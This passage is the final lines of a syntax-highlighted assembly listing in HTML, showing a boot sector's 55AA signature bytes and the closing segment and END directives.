</span><span class="sc1">; -----------------------------------------------------------------------------</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc5">SECSIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">             </span><span class="sc1">; Bootblock / partition table /</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">055</span><span class="sc4">,</span><span class="sc2">0AA</span><span class="sc0">                 </span><span class="sc1">; ROM signature</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">TEXT</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">START</span><span class="sc0">
</span></div></body>
</html>
